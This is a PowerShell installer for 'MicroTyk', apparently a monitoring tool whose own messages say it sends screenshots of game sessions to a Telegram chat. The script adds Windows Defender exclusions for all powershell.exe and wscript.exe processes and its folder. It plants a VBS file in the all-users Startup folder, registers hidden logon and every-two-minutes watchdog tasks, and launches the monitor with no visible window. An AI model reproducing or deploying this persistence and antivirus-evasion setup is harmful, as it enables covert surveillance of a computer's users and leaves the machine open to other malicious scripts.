# ============================================================
#  MicroTyk Automatic Installer
#  Installs MicroTyk + Watchdog + Creates scheduled tasks
#  Requires: Admin rights
# ============================================================

param(
  [string]$Token = "",
  [string]$ChatId = "",
  [switch]$NoStart = $false
)

# Check admin rights
$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  Write-Host "ERROR: This script requires Administrator rights" -ForegroundColor Red
  Write-Host "Run PowerShell as Administrator and try again" -ForegroundColor Yellow
  exit 1
}

Write-Host "=== MicroTyk Installation ===" -ForegroundColor Cyan
Write-Host ""

# Paths
$SourceDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
$InstallDir = "C:\MicroTyk"
$DataDir = "$env:LOCALAPPDATA\MicroTyk"

Write-Host "Source:      $SourceDir" -ForegroundColor Gray
Write-Host "Install to:  $InstallDir" -ForegroundColor Gray
Write-Host ""

# Create install directory
Write-Host "[1/7] Creating directories..." -ForegroundColor Yellow
try {
  if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
  }
  if (-not (Test-Path $DataDir)) {
    New-Item -ItemType Directory -Path $DataDir -Force | Out-Null
  }
  Write-Host "  ✅ Directories created" -ForegroundColor Green
} catch {
  Write-Host "  ❌ Failed: $_" -ForegroundColor Red
  exit 1
}

# Copy files
Write-Host "[2/7] Copying files..." -ForegroundColor Yellow
$files = @("MicroTyk.ps1", "GameWatch.ps1", "Watchdog.ps1", "MicroTyk.vbs")
foreach ($file in $files) {
  $src = Join-Path $SourceDir $file
  if (Test-Path $src) {
    Copy-Item $src (Join-Path $InstallDir $file) -Force
    Write-Host "  ✅ $file" -ForegroundColor Green
  }
}

# Create/Update config.ps1
Write-Host "[3/7] Configuring Telegram..." -ForegroundColor Yellow

if (-not $Token -or -not $ChatId) {
  # Try to read from existing config
  $existingCfg = Join-Path $InstallDir "config.ps1"
  if (Test-Path $existingCfg) {
    . $existingCfg
    if ($Token -and $ChatId) {
      Write-Host "  ✅ Using existing config (Token: $($Token.Substring(0,10))...)" -ForegroundColor Green
    }
  }
}

if (-not $Token -or $Token -like "*YOUR_*" -or -not $ChatId -or $ChatId -like "*YOUR_*") {
  Write-Host "  ⚠️  Token/ChatId not configured yet" -ForegroundColor Yellow
  Write-Host "  Enter Telegram Bot Token (or press Enter to skip):" -ForegroundColor Cyan
  $userToken = Read-Host "  Token"

  if ($userToken) {
    $Token = $userToken
    Write-Host "  Enter your Telegram Chat ID:" -ForegroundColor Cyan
    $userChatId = Read-Host "  ChatId"
    $ChatId = $userChatId
  }
}

# Write config.ps1
$configPath = Join-Path $InstallDir "config.ps1"
if ($Token -and $ChatId -and -not ($Token -like "*YOUR_*") -and -not ($ChatId -like "*YOUR_*")) {
  @"
# MicroTyk Configuration
`$Token = "$Token"
`$ChatId = "$ChatId"
# Optional: `$ExtraGameProcesses = @("Game.exe")
# Optional: `$PeriodicScreenshotMin = 20
# Optional: `$Active24x7 = `$true
"@ | Out-File $configPath -Encoding UTF8 -Force
  Write-Host "  ✅ Config saved" -ForegroundColor Green
} else {
  Write-Host "  ⚠️  Config NOT saved (Token/ChatId empty)" -ForegroundColor Yellow
}

# Defender exclusions
Write-Host "[4/7] Adding Defender exclusions..." -ForegroundColor Yellow
try {
  Add-MpPreference -ExclusionProcess "powershell.exe", "wscript.exe" -ErrorAction SilentlyContinue
  Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
  Write-Host "  ✅ Exclusions added" -ForegroundColor Green
} catch {
  Write-Host "  ⚠️  Could not add Defender exclusions (might need manual config)" -ForegroundColor Yellow
}

# Create Startup link
Write-Host "[5/7] Creating startup link..." -ForegroundColor Yellow
try {
  $startupDir = [Environment]::GetFolderPath('CommonStartup')
  $vbsPath = Join-Path $InstallDir "MicroTyk.vbs"
  $linkPath = Join-Path $startupDir "MicroTyk.vbs"

  if ((Test-Path $vbsPath)) {
    Copy-Item $vbsPath $linkPath -Force
    Write-Host "  ✅ Startup link created" -ForegroundColor Green
  }
} catch {
  Write-Host "  ⚠️  Could not create startup link: $_" -ForegroundColor Yellow
}

# Create scheduled tasks
Write-Host "[6/7] Creating scheduled tasks..." -ForegroundColor Yellow

try {
  # MicroTyk startup task
  $taskName = "MicroTyk"
  $psPath = Get-Command powershell.exe | Select-Object -ExpandProperty Source
  $scriptPath = Join-Path $InstallDir "MicroTyk.ps1"

  $action = New-ScheduledTaskAction -Execute $psPath `
    -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""

  $trigger = New-ScheduledTaskTrigger -AtLogOn
  $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -StartWhenAvailable

  $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
  if ($existingTask) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
  }

  Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
  Write-Host "  ✅ MicroTyk task created (runs at login)" -ForegroundColor Green

  # Watchdog task
  $watchdogName = "MicroTyk_Watchdog"
  $watchdogScript = Join-Path $InstallDir "Watchdog.ps1"

  $watchdogAction = New-ScheduledTaskAction -Execute $psPath `
    -Argument "-NoProfile -WindowStyle Hidden -File `"$watchdogScript`""

  $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 2) `
    -RepetitionDuration ([System.TimeSpan]::MaxValue)

  $watchdogSettings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -StartWhenAvailable

  $existingWatchdog = Get-ScheduledTask -TaskName $watchdogName -ErrorAction SilentlyContinue
  if ($existingWatchdog) {
    Unregister-ScheduledTask -TaskName $watchdogName -Confirm:$false
  }

  Register-ScheduledTask -TaskName $watchdogName -Action $watchdogAction -Trigger $watchdogTrigger `
    -Settings $watchdogSettings -Force | Out-Null
  Write-Host "  ✅ Watchdog task created (every 2 minutes)" -ForegroundColor Green

} catch {
  Write-Host "  ❌ Task creation failed: $_" -ForegroundColor Red
}

# Start MicroTyk
Write-Host "[7/7] Starting MicroTyk..." -ForegroundColor Yellow

if ($NoStart) {
  Write-Host "  ⏭️  Skipping start (use -NoStart flag)" -ForegroundColor Yellow
} else {
  try {
    $scriptPath = Join-Path $InstallDir "MicroTyk.ps1"
    if (Test-Path $scriptPath) {
      Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -NoNewWindow
      Write-Host "  ✅ MicroTyk started" -ForegroundColor Green
    }
  } catch {
    Write-Host "  ⚠️  Could not start MicroTyk: $_" -ForegroundColor Yellow
  }
}

Write-Host ""
Write-Host "=== Installation Complete ===" -ForegroundColor Green
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Cyan
Write-Host "  1. Check Telegram for test message (if Token/ChatId configured)" -ForegroundColor Gray
Write-Host "  2. Launch a game → Screenshot should arrive in ~20 seconds" -ForegroundColor Gray
Write-Host "  3. MicroTyk will auto-start at next login" -ForegroundColor Gray
Write-Host "  4. Watchdog will auto-restart if process crashes" -ForegroundColor Gray
Write-Host ""
Write-Host "Configuration: $configPath" -ForegroundColor Cyan
Write-Host "Data folder:   $DataDir" -ForegroundColor Cyan
Write-Host ""
Write-Host "If no Telegram notifications:" -ForegroundColor Yellow
Write-Host "  Edit: $configPath" -ForegroundColor Gray
Write-Host "  Add Token and ChatId, then restart MicroTyk" -ForegroundColor Gray
